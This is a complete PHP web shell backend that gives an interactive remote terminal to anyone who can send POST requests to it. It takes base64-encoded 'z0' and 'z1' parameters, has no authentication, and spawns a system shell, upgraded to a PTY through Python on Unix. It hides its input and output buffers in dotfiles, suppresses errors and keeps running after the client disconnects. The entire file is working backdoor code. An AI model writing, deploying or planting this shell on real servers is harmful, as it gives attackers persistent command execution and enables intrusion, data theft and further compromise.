<?php

@set_time_limit(0);
@ignore_user_abort(true);
@ini_set('max_execution_time', 0);
@error_reporting(0);

$work_dir   = getcwd();
$input_file = $work_dir . '/.input.txt';
$out_file   = $work_dir . '/.output.txt';
$pid_file   = $work_dir . '/.pid.txt';

function getSafeStr($str){
    if (function_exists("mb_convert_encoding")) {
        $detected = mb_detect_encoding($str, array("UTF-8", "CP950", "BIG5", "GBK", "GB2312", "ASCII"));
        if ($detected && $detected !== "UTF-8") {
            return mb_convert_encoding($str, 'UTF-8', $detected);
        }
        return $str;
    }

    $s1 = iconv('big5', 'utf-8//IGNORE', $str);
    if(strlen($s1) > 0) {
        return $s1;
    }

    return iconv('gbk', 'utf-8//IGNORE', $str);
}

function finish() {
    @ob_end_clean();
    header("Connection: close");
    @ob_start();
    $size = ob_get_length();
    header("Content-Length: $size");
    @ob_end_flush();
    @flush();
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }
}

function compat_clearstatcache($file) {
    if (version_compare(PHP_VERSION, '5.3.0', '>=')) {
        clearstatcache(true, $file);
    } else {
        clearstatcache();
    }
}

$type = isset($_POST['z0']) ? base64_decode($_POST['z0']) : '';
$z1   = isset($_POST['z1']) ? base64_decode($_POST['z1']) : '';

$result = array("status" => "fail", "msg" => "");

if ($type == "create") {
    @unlink($input_file);
    file_put_contents($out_file, '');
    file_put_contents($pid_file, 'running');

    $win   = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
    $shell = $z1 ? $z1 : ($win ? "cmd.exe" : "/bin/bash");

    $descriptorspec = array(
        0 => array("pipe", "r"), // stdin
        1 => array("pipe", "w"), // stdout
        2 => array("pipe", "w")  // stderr
    );

    if ($win) {
        $outputfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "out_" . rand() . ".txt";
        $errorfile  = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "err_" . rand() . ".txt";
        
        @file_put_contents($outputfile, '');
        @file_put_contents($errorfile, '');
        $descriptorspec[1] = array("file", $outputfile, "a");
        $descriptorspec[2] = array("file", $errorfile, "a");
        $process = proc_open($shell, $descriptorspec, $pipes);
    } else {
        $env = array('TERM' => 'xterm');
        $process = proc_open($shell, $descriptorspec, $pipes, NULL, $env);
    }

    if (!is_resource($process)) {
        $result["msg"] = base64_encode("Failed to initialize process engine.");
        echo json_encode($result);
        exit(1);
    }

    if ($win) {
        stream_set_blocking($pipes[0], 1); 
        $reader = fopen($outputfile, "r+");
        $error  = fopen($errorfile, "r+");
    } else {
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        $reader = $pipes[1];
        $error  = $pipes[2];
        
        $python_cmd   = "python3 -c 'import pty; pty.spawn(\"$shell\")'";
        $spawn_script = "which python3 >/dev/null 2>&1 && exec $python_cmd || exec python -c 'import pty; pty.spawn(\"$shell\")'";
        
        fwrite($pipes[0], "$spawn_script\n");
        fflush($pipes[0]);
        usleep(100000); 

        fwrite($pipes[0], "stty -echo\n");
        fflush($pipes[0]);
        usleep(50000);

        while (($chunk = fread($reader, 10240)) !== false && $chunk !== "") {}
        while (($err_chunk = fread($error, 10240)) !== false && $err_chunk !== "") {}
    }

    $result["status"] = "success";
    $result["msg"]    = "Engine spawned in background execution state.";
    echo json_encode($result);
    finish(); 

    $idle = 0;
    while ($idle < 1000000) {
        compat_clearstatcache($pid_file);
        if (!file_exists($pid_file) || file_get_contents($pid_file) !== 'running') {
            break;
        }

        if (file_exists($input_file) && filesize($input_file) > 0) {
            $fp = fopen($input_file, 'r+');
            if ($fp && flock($fp, LOCK_EX)) {
                $writeBuffer = stream_get_contents($fp);
                ftruncate($fp, 0);
                fflush($fp);
                flock($fp, LOCK_UN);
                fclose($fp);

                if ($writeBuffer !== false && strlen($writeBuffer) > 0) {
                    fwrite($pipes[0], $writeBuffer);
                    fflush($pipes[0]);
                    $idle = 0;
                    usleep(1000);
                }
            }
        } else {
            $idle++;
        }

        $output = "";
        while (($chunk = fread($reader, 10240)) !== false && $chunk !== "") {
            $output .= $chunk;
        }
        if ($output !== "") {
            $output = getSafeStr($output);
            file_put_contents($out_file, $output, FILE_APPEND | LOCK_EX);
        }
        if ($win) {
            @ftruncate($reader, 0);
        }

        $errput = "";
        while (($err_chunk = fread($error, 10240)) !== false && $err_chunk !== "") {
            $errput .= $err_chunk;
        }
        if ($errput !== "") {
            $errput = getSafeStr($errput);
            file_put_contents($out_file, $errput, FILE_APPEND | LOCK_EX);
        }
        if ($win) {
            @ftruncate($error, 0);
        }

        $resize_file = $work_dir . '/.resize.txt';
        if (file_exists($resize_file)) {
            $resize = explode(':', @file_get_contents($resize_file));
            @unlink($resize_file);

            if (count($resize) == 2) {
                $rows = (int)$resize[0];
                $cols = (int)$resize[1];

                @shell_exec("stty rows $rows cols $cols 2>/dev/null");
            }
        }

        $status = proc_get_status($process);
        if (!$status['running']) {
            break;
        }

        usleep(15000); 
    }

    @fclose($pipes[0]);
    @fclose($reader);
    @fclose($error);
    @proc_terminate($process);
    @proc_close($process);
    
    @unlink($pid_file);
    @unlink($input_file);
    if ($win) {
        @unlink($outputfile);
        @unlink($errorfile);
    }
} 

else if ($type == "write") {
    $rawBytes = base64_decode($z1, true);
    if ($rawBytes === false) {
        $rawBytes = $z1; 
    }

    file_put_contents($input_file, $rawBytes, FILE_APPEND | LOCK_EX);
    
    $result["status"] = "success";
    $result["msg"]    = "Input buffer queued.";
    echo json_encode($result);
} 

else if ($type == "read") {
    $readContent = '';
    compat_clearstatcache($out_file);
    
    if (file_exists($out_file) && filesize($out_file) > 0) {
        $fp = fopen($out_file, 'r+');
        if ($fp && flock($fp, LOCK_EX)) {
            $readContent = stream_get_contents($fp);
            ftruncate($fp, 0);
            fflush($fp);
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }

    $result["status"] = "success";
    $result["msg"]    = base64_encode($readContent);
    echo json_encode($result);
}

else if ($type == "resize") {
    $cols = isset($_POST['z1']) ? base64_decode($_POST['z1']) : 0;
    $rows = isset($_POST['z2']) ? base64_decode($_POST['z2']) : 0;

    if ($cols <= 0 || $rows <= 0) {
        $result['status'] = 'error';
        $result['msg']    = base64_encode('Invalid dimensions.');
        echo json_encode($result);
        exit;
    }

    $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
    if ($win) {
        $cmd = "mode con: cols=$cols lines=$rows && cls\r\n";
        file_put_contents($input_file, $cmd, FILE_APPEND | LOCK_EX);
    } else {
        file_put_contents($work_dir . '/.resize.txt', "$rows:$cols");
    }

    $result['status'] = 'success';
    $result['msg']    = base64_encode('Dimensions are updated');
    echo json_encode($result);
}

else if ($type == "stop") {
    file_put_contents($pid_file, 'stopped');

    @unlink($input_file);
    $resize_file = $work_dir . '/.resize.txt';
    if (file_exists($resize_file)) {
        @unlink($resize_file);
    }

    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        foreach (glob(sys_get_temp_dir() . '/out_*.txt') as $tmp_out) {
            @unlink($tmp_out);
        }
        foreach (glob(sys_get_temp_dir() . '/err_*.txt') as $tmp_err) {
            @unlink($tmp_err);
        }
    }

    usleep(50000);
    @unlink($pid_file);

    $result["status"] = "stop";
    $result["msg"]    = base64_encode("Engine shutdown initiated and resources cleaned.");
    echo json_encode($result);
}

?>